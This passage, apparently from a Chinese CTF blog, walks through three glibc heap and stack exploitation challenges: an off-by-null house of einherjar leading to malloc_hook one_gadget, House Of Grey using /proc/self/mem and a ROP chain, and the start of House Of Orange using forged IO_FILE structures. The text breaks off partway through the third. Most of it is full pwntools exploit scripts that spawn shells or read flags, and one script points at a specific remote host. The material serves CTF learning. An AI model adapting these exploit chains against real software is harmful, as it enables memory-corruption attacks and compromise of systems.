enabledPIE:      PIE enabled\n\n简单描述只有4个功能, 添加,删除,查看,退出.保护全开,只有一个漏洞可以利用.\nvulunsigned __int64 __fastcall read_input(__int64 a1, int a2)&#123;  char buf; // [rsp+13h] [rbp-Dh]  int i; // [rsp+14h] [rbp-Ch]  unsigned __int64 v5; // [rsp+18h] [rbp-8h]  v5 = __readfsqword(0x28u);  for ( i = 0; i &lt; a2; ++i )  &#123;    if ( (signed int)read(0, &amp;buf, 1uLL) &lt; 0 )      puts(&quot;Read error!\\n&quot;);    if ( buf == 10 )      break;    *(_BYTE *)(a1 + i) = buf;  &#125;  *(_BYTE *)(i + a1) = 0;                       // off by null  return __readfsqword(0x28u) ^ v5;&#125;\n\noff by null 漏洞,还有一个是在free时,unsigned int与signed int的索引值,但利用不了…\n知识点house of einherjar, off by one, unlink check, fastbin attack, realloc_hook to banance stack, one_gadget\n思路通过house of einherjar实现堆合并,然后通过unsorted bin特性分割堆块,打印获取main_arena + 88地址,通过fastbin attack 打入 malloc_hook - 0x23处,通过 malloc_hook来实现Onegaget,realloc_hook调整execve第二个参数\n利用准备#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;timu&quot;libFile  = &quot;./libc.so.6&quot;libFile  = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;Your choice :&#x27;, str(1))\tsla(&#x27;Size:&#x27;, str(size))\tsa(&#x27;Data:&#x27;, data)def rm(idx):\tsla(&#x27;Your choice :&#x27;, str(2))\tsla(&#x27;Index:&#x27;, str(idx))def dp():\tsla(&#x27;Your choice :&#x27;, str(3))#def q():#\tsla(&#x27;:&#x27;, str(5))\n\n\n\n构造堆快布局ad(0x80, &#x27;A&#x27; * 0x80) # idx 0 为了合并ad(0x80, &#x27;B&#x27; * 0x80) # idx 1 为了在合并后,然后分割堆快打印出main_arenaad(0x68, &#x27;C&#x27; * 0x68) # idx 2 为了可以利用fastbin attack 和 off by nullad(0xF0, &#x27;E\\n&#x27;) # idx 3 为了使用house of einherjar 合并 chunk 0控制所有堆块ad(0x68, &#x27;F\\n&#x27;) #为了防止top chunk 向前合并\n\n使用house of einherjar 来合并 chunk 1rm(2) #为了使用 off by null 覆盖 chunk3 释放重新开辟# use house of einherjarp = &#x27;C&#x27; * 0x60p += p64(0x190) #prev_size = chunk 0 addr - chunk 3 addrad(0x68, p) #使用 off by null 覆盖 chunk 3rm(2) #先释放掉进入fastbin中, 后面只需通过溢出修改fd指向我们想要的地方# 触发 house of eiherjar   #避免unlink检查, 先是放掉chunk 0, 这样 chunk0 的fd 和 bk指向的都是main_arena + 88,这样可以绕过unlink检查 FD-bk != P || BK-&gt;fd != prm(0)rm(3)  #合并到chunk 0\n\n泄漏 main_arena 和libc基址通过分割unsorted bin实现main_arena信息转移,通过开辟0x80内存后, main_arena信息会跑到chunk 1中, 由于我们还对chunk 1没有释放, 直接打印即可获取main_arena + 88 处地址\n# leak main_arenaad(0x80, &#x27;A&#x27; * 16 + &#x27;\\n&#x27;) #分割 unsorted bin, main_arena 会出现在 chunk 1中dp()main_arena = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 0x58libc_base = main_arena - 0x3c4b20li(&#x27;main_arena &#x27; + hex(main_arena))li(&#x27;libc_base &#x27; +  hex(libc_base))\n\nfastbin attack打入 malloc_hook处#通过开辟内存溢出掌控chunk 2, 在fastbin 中chunk 2是我们之前释放的, 现在只需要修改fd指向 malloc_hook -0x23处   p = &#x27;\\x00&#x27; * 0x80p += p64(0)p += p64(0x71)p += p64(main_arena - 0x33)p += &#x27;\\n&#x27;ad(0xA0, p)ad(0x68, &#x27;\\n&#x27;) #for ajust fastbin\n\n修改malloc_hook由于直接修改malloc_hook为one_gadget,由于参数 [rsp + x] x 为0x30,0x50,0x70都不能使[rsp + x]为0,也就是说在执行execve的时候,第二个参数的内容没有满足为 0,所以不能触发get shell, 需要使用 realloc_hook来进行调整rsp的偏移,进而修改[rsp + x]满足为0,而在realloc_hook处,我们可以填写reallc的地址根据push来调整rsp的偏移,达到 [rsp + x]为0, 而在执行push完之后,就先进行判断 realloc_hook是否为0,若不为0,就先执行 realloc_hook处,这时我们就可以填写one_gadget 到realloc_hook处来打one_gadget\nrealloc_hook反汇编pwndbg&gt; disass 0x7fe7cb0ea6c0Dump of assembler code for function __GI___libc_realloc:   0x00007fe7cb0ea6c0 &lt;+0&gt;:\tpush   r15   0x00007fe7cb0ea6c2 &lt;+2&gt;:\tpush   r14   0x00007fe7cb0ea6c4 &lt;+4&gt;:\tpush   r13   0x00007fe7cb0ea6c6 &lt;+6&gt;:\tpush   r12   0x00007fe7cb0ea6c8 &lt;+8&gt;:\tmov    r13,rsi   0x00007fe7cb0ea6cb &lt;+11&gt;:\tpush   rbp   0x00007fe7cb0ea6cc &lt;+12&gt;:\tpush   rbx   0x00007fe7cb0ea6cd &lt;+13&gt;:\tmov    rbx,rdi   0x00007fe7cb0ea6d0 &lt;+16&gt;:\tsub    rsp,0x38   0x00007fe7cb0ea6d4 &lt;+20&gt;:\tmov    rax,QWORD PTR [rip+0x33f8f5]        # 0x7fe7cb429fd0   0x00007fe7cb0ea6db &lt;+27&gt;:\tmov    rax,QWORD PTR [rax]   0x00007fe7cb0ea6de &lt;+30&gt;:\ttest   rax,rax   0x00007fe7cb0ea6e1 &lt;+33&gt;:\tjne    0x7fe7cb0ea8e8 &lt;__GI___libc_realloc+552&gt;   0x00007fe7cb0ea6e7 &lt;+39&gt;:\ttest   rsi,rsi   0x00007fe7cb0ea6ea &lt;+42&gt;:\tjne    0x7fe7cb0ea6f5 &lt;__GI___libc_realloc+53&gt;   0x00007fe7cb0ea6ec &lt;+44&gt;:\ttest   rdi,rdi\n\n通过调试试出了两个one_gadget满足execve 第二个参数内容为0\n\nmalloc_hook &#x3D; libc_base + 0x4526a, realloc_hook &#x3D; realloc_addr + 2\nmalloc_hook &#x3D; libc_base + 0xf1147, realloc_hook &#x3D; realloc_addr + 20\n\nexecve执行情况如下0x7fe7cb15715d &lt;exec_comm+2285&gt;    call   execve &lt;0x7fe7cb132770&gt;path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */argv: 0x7ffe640ad200 ◂— 0x0envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— &#x27;LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6&#x27;\n\npayload构造如下#modify malloc_hookrealloc_addr = libc_base + lib.sym[&#x27;realloc&#x27;]li(&#x27;realloc_addr &#x27; +  hex(realloc_addr))gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + gadget[3]p = &#x27;\\x11&#x27; * (0x13 - 8)p += p64(one_gadget) # realloc_hook#mallok_hook then call realloc for banance stackthen call one_gadgetp += p64(realloc_addr + 20) # malloc_hookp += &#x27;\\n&#x27;ad(0x68, p)\n\nget shell# get shellsl(&#x27;1&#x27;)sl(&#x27;1&#x27;)\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;timu&quot;libFile  = &quot;./libc.so.6&quot;libFile  = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;Your choice :&#x27;, str(1))\tsla(&#x27;Size:&#x27;, str(size))\tsa(&#x27;Data:&#x27;, data)def rm(idx):\tsla(&#x27;Your choice :&#x27;, str(2))\tsla(&#x27;Index:&#x27;, str(idx))def dp():\tsla(&#x27;Your choice :&#x27;, str(3))#def q():#\tsla(&#x27;:&#x27;, str(5))#--------------------------Exploit--------------------------def exploit():\tad(0x80, &#x27;A&#x27; * 0x80) # idx 0\tad(0x80, &#x27;B&#x27; * 0x80) # idx 1\tad(0x68, &#x27;C&#x27; * 0x68) # idx 2\tad(0xF0, &#x27;E\\n&#x27;)      # idx 3\tad(0x68, &#x27;F\\n&#x27;) #for avoid merge to top chunk\trm(2)\t# use house of einherjar\tp = &#x27;C&#x27; * 0x60\tp += p64(0x190)\tad(0x68, p)\trm(2) #for fastbin attack, now make it in fastbin\t# trigger house of eiherjar\trm(0)\trm(3)\t# leak main_arena\tad(0x80, &#x27;A&#x27; * 16 + &#x27;\\n&#x27;)\tdp()\tmain_arena = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - 0x58\tlibc_base = main_arena - 0x3c4b20\tli(&#x27;main_arena &#x27; + hex(main_arena))\tli(&#x27;libc_base &#x27; +  hex(libc_base))\t# fastbin attack to malloc_hook - 0x23\tp = &#x27;\\x00&#x27; * 0x80\tp += p64(0)\tp += p64(0x71)\tp += p64(main_arena - 0x33)\tp += &#x27;\\n&#x27;\tad(0xA0, p)\tad(0x68, &#x27;\\n&#x27;) #for ajust fastbin\t#modify malloc_hook\trealloc_addr = libc_base + lib.sym[&#x27;realloc&#x27;]\tli(&#x27;realloc_addr &#x27; +  hex(realloc_addr))\tgadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]\tone_gadget = libc_base + gadget[3]\tp = &#x27;\\x11&#x27; * (0x13 - 8)\tp += p64(one_gadget)\t#mallok_hook then call realloc for banance stackthen call one_gadget\tp += p64(realloc_addr + 20)\tp += &#x27;\\n&#x27;\tad(0x68, p)\t# get shell\tsl(&#x27;1&#x27;)\tsl(&#x27;1&#x27;)\t#db()def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\texploit()\tfinish()&#x27;&#x27;&#x27;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL&#x27;&#x27;&#x27;\n\n\n\n\nHouse Of Grey来源World of Attack &amp; Defense\n难度8 &#x2F; 10\n保护Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\n简单描述该题没有明显的分界点, 涉及的知识也比较陌生,十分经典. 通过创建子进程方式避免被直接调试,且有记时,保护全开,要理解linux下的一些文件.如 &#x2F;proc&#x2F;self&#x2F;下的文件,通过seccomp-tools检验程序, 发现禁用execve函数,只能通过open,read,write获取flag\nvulvoid __fastcall fn(void *arg)&#123;  unsigned __int64 v1; // rsi  int fd; // [rsp+10h] [rbp-70h]  signed int i; // [rsp+14h] [rbp-6Ch]  int v4; // [rsp+1Ch] [rbp-64h]  int v5; // [rsp+1Ch] [rbp-64h]  void *v6; // [rsp+20h] [rbp-60h]  char buf[24]; //---------------------stack ouverflow  void *v8; // [rsp+48h] [rbp-38h]  char nptr; // [rsp+50h] [rbp-30h]  unsigned __int64 v10; // [rsp+78h] [rbp-8h]  __int64 savedregs; // [rsp+80h] [rbp+0h]  v10 = __readfsqword(0x28u);  puts(&quot;You get into my room. Just find something!\\n&quot;);  v6 = malloc(100000uLL);  if ( !v6 )  &#123;    perror(&quot;malloc&quot;);    exit(1);  &#125;  if ( (unsigned int)sub_14D2(100000LL) )    exit(1);  v8 = v6;  for ( i = 0; i &lt;= 29; ++i )  &#123;    sub_FEE();    switch ( (unsigned int)&amp;savedregs )    &#123;      case 1u:        puts(&quot;So man, what are you finding?&quot;);       //length 40 can be stack overflow--------        buf[(signed int)((unsigned __int64)read(0, buf, 40uLL) - 1)] = 0;                if ( (unsigned int)check(buf) )//不能读取flag文件        &#123;          puts(&quot;Man, don&#x27;t do it! See you^.&quot;);          exit(1);        &#125;        fd = open(buf, 0);        if ( fd &lt; 0 )        &#123;          perror(&quot;open&quot;);          exit(1);        &#125;        return;      case 2u:         puts(&quot;So, Where are you?&quot;);        read(0, &amp;nptr, 0x20uLL);        v1 = strtoull(&amp;nptr, 0LL, 10);        lseek(fd, v1, 0); //可以定位fd的地址        break;      case 3u:        puts(&quot;How many things do you want to get?&quot;);        read(0, &amp;nptr, 8uLL);        v4 = atoi(&amp;nptr);        if ( v4 &lt;= 100000 )        &#123;          v5 = read(fd, v8, v4);          if ( v5 &lt; 0 )          &#123;            puts(&quot;error read&quot;);            perror(&quot;read&quot;);            exit(1);          &#125;          puts(&quot;You get something:&quot;);          write(1, v8, v5);        &#125;        else        &#123;          puts(&quot;You greedy man!&quot;);        &#125;        break;      case 4u:        puts(&quot;What do you want to give me?&quot;);        puts(&quot;content: &quot;);        read(0, v8, 0x200uLL);                  // v8 can be modifyed        break;      case 5u:        exit(0);        return;      default:        continue;    &#125;  &#125;  puts(&quot;\\nI guess you don&#x27;t want to say Goodbye!&quot;);  puts(&quot;But sadly, bye! Hope you come again!\\n&quot;);  exit(0);&#125;\n\nvul: 存在堆栈溢出, 通过覆盖 v8实现任意地址读写\n知识点由于可以读取除了flag之外的文件，就可以读取&#x2F;proc&#x2F;self&#x2F;maps文件,Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。&#x2F;proc&#x2F;self&#x2F;mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。\n程序最后有一个exit(0)，由此，覆盖fn函数的返回地址来构造ROP不可行，但可以覆盖read函数的返回地址，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。为了覆盖read的返回地址，就需要确定栈的地址。\n但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，并不知道程序的栈地址。但是，可以通过读取&#x2F;proc&#x2F;self&#x2F;mem文件，来搜索标记，已确定程序的栈地址, 注意,堆栈的生长方向是由高地址向低地址生长。\n思路\n如何调试? 使用ida把超时函数的exit给patch掉, 通过gdb attach的方式调试子进程\n漏洞 1: 明显的漏洞点就在执行1功能的时候就有字符串溢出, 可以覆盖v8变量通过4功能实现任意地址写入.\n漏洞 2: 可以通过输入打开文件为 &#x2F;proc&#x2F;self&#x2F;maps来获取各个基址\n绕过PIE，以及利用&#x2F;proc&#x2F;self&#x2F;mem来读取任意地址的内容\n通过在&#x2F;proc&#x2F;self&#x2F;mem中搜索’&#x2F;proc&#x2F;self&#x2F;maps’字符串来定位堆栈的地址\n计算出read ret地址,构造rop链读取flag\n\n利用获取基址sla(&#x27;?&#x27;, &#x27;y&#x27;)#leaking base addrp = &#x27;/proc/self/maps&#x27;fid(p)get(1500)ru(&#x27;You get something:\\n&#x27;)exe_base = int(r(12), 16)ru(&#x27;[heap]\\n&#x27;)stack_start = int(r(12), 16)ru(&#x27;-&#x27;)stack_end =   int(r(12), 16)ru(&#x27;rw-p 00000000 00:00 0 \\n&#x27;)libc_base = int(r(12), 16)li(&#x27;exe_base  &#x27; + hex(exe_base))li(&#x27;libc_base &#x27; + hex(libc_base))li(&#x27;stack_start &#x27; + hex(stack_start))li(&#x27;stack_end   &#x27; + hex(stack_end))pop_rdi_ret_offset = 0x1823pop_rsi_r15_ret_offset = 0x1821pop_rdi_ret = exe_base + pop_rdi_ret_offsetpop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offsetopen_plt = exe_base + exe.plt[&#x27;open&#x27;]read_plt = exe_base + exe.plt[&#x27;read&#x27;]puts_plt = exe_base + exe.plt[&#x27;puts&#x27;]\n\n\n\n搜索内存定位read ret地址接下来，就需要读取&#x2F;proc&#x2F;self&#x2F;mem来搜索内存，确定栈地址了\nfor ( i = 0; i &lt;= 29; ++i )  &#123;    sub_FEE(); ...\n\n通过以上逻辑,程序只可以循环使用30次, 前面使用了4次, ，最后还需要用2次,搜索内存只能使用24次.\n而每次最多允许读取100000个字节的数据，由此，能搜索2400000个字节的内容，通过调试，观察数据的栈地址，计算它与stack_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，应该从stack_end – x ~ stack_end搜索\n#position stack addroffset = 0xf800000li(&#x27;debug---------------&#x27;)#begin_offset ~ stack_endstack_begin_offset = stack_end - offset - 24 * 100000li(&#x27;stack_begin_offset &#x27; + hex(stack_begin_offset))li(&#x27;stack_end   &#x27; +        hex(stack_end))fid(&#x27;/proc/self/mem&#x27;)   #打开该时起始地址为0,则偏移直接为stack_begin_offset地址loc(stack_begin_offset) #loacate in stack_begin_offset# searchingfor i in range(0, 24): #内存搜索&#x27;/proc/self/mem&#x27;来定位栈地址.\tget(100000)\ttext = ru(&#x27;1.Find something&#x27;)\tif &#x27;/proc/self/mem&#x27; in text:\t\tcontent = text.split(&#x27;/proc/self/mem&#x27;)[0] //若找到, 切割该字符串,获取前面的内容长度.\t\tbreak\tif i == 23:\t\tli(&#x27;not found&#x27;)\t\texit(0)v8_addr = stack_begin_offset + i * 100000 + len(content) - 0x14li(&#x27;v8_addr: &#x27; + hex(v8_addr))read_ret = v8_addr - (0x60 - 0x08) + 0x20li(&#x27;read_ret: &#x27; + hex(read_ret))\n\n构造rop链在这里,只能通过写入read的 ret地址, 因为只有在刚读取完成之后, 返回的地址才不会被覆盖, 其他函数修改是被覆盖的,没有效果.\np = &#x27;/proc/self/mem&#x27;.ljust(24, &#x27;\\x00&#x27;) + p64(read_ret)\tfid(p) # fd as 5\t#rop    #64位中 三个参数函数的传参方式\t&#x27;&#x27;&#x27;\tread(fd, buf, length)\t1 RDI  0x0  #fd\t2 RSI  0x7fd5ffbc3640 ◂— &#x27;/proc/self/mem&#x27; #buf\t3 RDX  0x28 #length\t&#x27;&#x27;&#x27;\tret = read_ret\t#open  ./flag\tp = p64(pop_rdi_ret) + p64(ret + 15 * 8)\tp += p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(open_plt)\t# read flag to buffer, fd is 6\tp += p64(pop_rdi_ret) + p64(6)\tp += p64(pop_rsi_r15_ret) + p64(ret + 15 * 8) + p64(0) + p64(read_plt)\t# puts flag\tp += p64(pop_rdi_ret) + p64(ret + 15 * 8) + p64(puts_plt)\t# ./flag str will be replace flag&#123;***&#125;\t#p = p64(pop_rdi_ret) + p64()\tp += &#x27;./flag\\x00&#x27;\t#db()\t\tgiv(p)\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0gan# Team  : D0g3from pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]#context.terminal = &#x27;konsole&#x27;#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile  = &quot;house_of_grey&quot;libFile  = &quot;&quot;remoteIp = &quot;111.198.29.45&quot;remotePort = 44908LOCAL = 0LIB   = 0r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x :  io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()pd32  = lambda x : p32(x).decode() #python3 not surport str + bytespd64  = lambda x : p64(x).decode()li    = lambda x : log.info(x)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def fid(text):\tsla(&#x27;5.Exit\\n&#x27;, &#x27;1&#x27;)\tsla(&#x27;?&#x27;, text)def loc(offset):\tsla(&#x27;5.Exit\\n&#x27;, &#x27;2&#x27;)\tsla(&#x27;?&#x27;, str(offset))\tdef get(length):\tsla(&#x27;5.Exit\\n&#x27;, &#x27;3&#x27;)\tsla(&#x27;?&#x27;, str(length))def giv(text):\tsla(&#x27;5.Exit\\n&#x27;, &#x27;4&#x27;)\tsla(&#x27;?&#x27;, text)def q(text):\tsla(&#x27;5.Exit\\n&#x27;, &#x27;5&#x27;)#--------------------------Exploit--------------------------def exploit():\tsla(&#x27;?&#x27;, &#x27;y&#x27;)\t#leaking base addr\tp = &#x27;/proc/self/maps&#x27;\tfid(p)\tget(1500)\tru(&#x27;You get something:\\n&#x27;)\texe_base = int(r(12), 16)\tru(&#x27;[heap]\\n&#x27;)\tstack_start = int(r(12), 16)\tru(&#x27;-&#x27;)\tstack_end =   int(r(12), 16)\tru(&#x27;rw-p 00000000 00:00 0 \\n&#x27;)\tlibc_base = int(r(12), 16)\tli(&#x27;exe_base  &#x27; + hex(exe_base))\tli(&#x27;libc_base &#x27; + hex(libc_base))\tli(&#x27;stack_start &#x27; + hex(stack_start))\tli(&#x27;stack_end   &#x27; + hex(stack_end))\tpop_rdi_ret_offset = 0x1823\tpop_rsi_r15_ret_offset = 0x1821\tpop_rdi_ret = exe_base + pop_rdi_ret_offset\tpop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset\topen_plt = exe_base + exe.plt[&#x27;open&#x27;]\tread_plt = exe_base + exe.plt[&#x27;read&#x27;]\tputs_plt = exe_base + exe.plt[&#x27;puts&#x27;]\t#position stack addr\toffset = 0xf800000\tli(&#x27;debug---------------&#x27;)\t#begin_offset ~ stack_end\tstack_begin_offset = stack_end - offset - 24 * 100000\tli(&#x27;stack_begin_offset &#x27; + hex(stack_begin_offset))\tli(&#x27;stack_end   &#x27; +        hex(stack_end))\tfid(&#x27;/proc/self/mem&#x27;)\tloc(stack_begin_offset)\t# searching\tfor i in range(0, 24):\t\tget(100000)\t\ttext = ru(&#x27;1.Find something&#x27;)\t\tif &#x27;/proc/self/mem&#x27; in text:\t\t\tcontent = text.split(&#x27;/proc/self/mem&#x27;)[0]\t\t\tbreak\t\tif i == 23:\t\t\tli(&#x27;not found&#x27;)\t\t\texit(0)\tv8_addr = stack_begin_offset + i * 100000 + len(content) - 0x14\tli(&#x27;v8_addr: &#x27; + hex(v8_addr))\tread_ret = v8_addr - (0x60 - 0x08) + 0x20\tli(&#x27;read_ret: &#x27; + hex(read_ret))\tp = &#x27;/proc/self/mem&#x27;.ljust(24, &#x27;\\x00&#x27;) + p64(read_ret)\tfid(p) # fd as 5\t#rop\t&#x27;&#x27;&#x27;\t3 RDX  0x28 #length\t1 RDI  0x0  #fd\t2 RSI  0x7fd5ffbc3640 ◂— &#x27;/proc/self/mem&#x27; #buffer\t&#x27;&#x27;&#x27;\tret = read_ret\t#open  ./flag\tp = p64(pop_rdi_ret) + p64(ret + 15 * 8)\tp += p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(open_plt)\t# read flag to buffer, fd is 6\tp += p64(pop_rdi_ret) + p64(6)\tp += p64(pop_rsi_r15_ret) + p64(ret + 15 * 8) + p64(0) + p64(read_plt)\t# puts flag\tp += p64(pop_rdi_ret) + p64(ret + 15 * 8) + p64(puts_plt)\t# ./flag str will be replace flag&#123;***&#125;\t#p = p64(pop_rdi_ret) + p64()\tp += &#x27;./flag\\x00&#x27;\t#db()\t\tgiv(p)def finish():\tia()\tc()#--------------------------Main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\texe = ELF(exeFile)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\t\tio = exe.process(env = &#123;&quot;LD_PRELOAD&quot; : libFile&#125;)\t\telse:\t\t\tio = exe.process()\t\telse:\t\texe = ELF(exeFile)\t\tio = remote(remoteIp, remotePort)\t\tif LIB:\t\t\tlib = ELF(libFile)\t\texploit()\tfinish()    \n\n\n\n\n\nHouse Of Orange来源2016 ctf-HITCON\n环境libc: libc.2.23\nUnbuntu16\n难度8 &#x2F; 10\n保护 Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled\n\n\n\n简单描述保护全开,有添加功能和编辑功能,只能添加4次,每次添加都会malloc三次分别储存不同的信息, 可以编辑三次,没有free函数,是经典的 House Of Orange漏洞利用类型.\nvullength = InputNum();if ( length &gt; 0x1000 )  length = 4096;                              // vulprintf(&quot;Name:&quot;);InputContent((void *)qword_203068[1], length);\n\n申请大小小于0x1000时,存在堆溢出漏洞.\n知识点House of orange ( modify top chunk realize free, unsoted bin attack, small bin attack, IO_FILE)\n思路使用堆溢出修改top chunk大小(按照内存对其), 再申请一个大小大于top chunk size 的chunk,然而old top chunk就会被free掉,申请一个large bin大小的chunk,由于large bin申请成功后fd_nextsize和bk_nextsize会指向自身地址,可以泄漏heap地址,然而,申请的位置也恰好含有以前所剩的main_arena信息,所以直接打印即可泄漏libc. 后面就通过unsorted bin attack修改IO_list_all为main_arena + 0x58, 然后根据small bin管理机制,修改main_arena  + 0x58处的fake IO_FILE的chain的值指向伪造的IO_FILE,而使伪造堆块满足fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 然后会调用vtable中的__overflow 函数,然而我们可以伪造再一个vtable,实现在调用__overflow的时候调用我们的函数,这里函数就改为system,传入参数需要在伪造的IO_FILE头部写入’&#x2F;bin&#x2F;sh\\x00’然后在unsoretd bin被破坏之后再次申请时报错, 那触发异常就会打印错误信息,malloc_printerr是malloc中用来打印错误的函数，而 malloc_printerr其实是调用 __libc_message函数之后调用abort函数，abort函数其中调用了_IO_flush_all_lockp, 然后根据IO_list_all中的值去遍历IO_FILE调用IO_FILE 的vtable中的 __overflow函数指针, 然后就可以调用system 传入 ‘&#x2F;bin&#x2F;sh\\00’ get shell\n利用准备#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;houseoforange&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;#libFile = &#x27;./libc64-2.19.so&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)db    = lambda   : gdb.attach(io)#--------------------------Func-----------------------------def ad(size, data):\tsla(&#x27;Your choice : &#x27;, str(1))\tsla(&#x27;name :&#x27;, str(size))\tsa(&#x27;Name :&#x27;, data)\tsla(&#x27;Price of Orange:&#x27;, str(16))\tsla(&#x27;Orange:&#x27;, &#x27;1&#x27;);def md(size, data):\tsla(&#x27;Your choice : &#x27;, 